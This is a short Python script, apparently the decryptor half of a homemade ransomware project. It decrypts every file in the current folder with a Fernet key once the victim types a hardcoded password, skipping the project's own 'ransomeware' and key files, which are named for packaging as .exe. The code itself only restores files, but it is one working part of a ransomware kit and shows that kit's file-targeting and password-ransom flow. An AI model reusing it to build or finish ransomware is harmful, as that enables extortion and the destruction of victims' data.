#! /usr/bin/env python3

import os
from cryptography.fernet import Fernet

#file finder

files = []

for file in os.listdir():
	if file == "ransomeware.py" or file == "decrypt.py" or file == "thekey.key" or file == "ransomeware.exe" or file == "decrypt.exe":
		continue
	if os.path.isfile(file):
		files.append(file)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

password = "jegblehacket"

user_phrase = input("Enter the password to decrypt your files\n")

if user_phrase == password:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congratulations! Your files have been decrypted")
else:
	print("Wrong password")
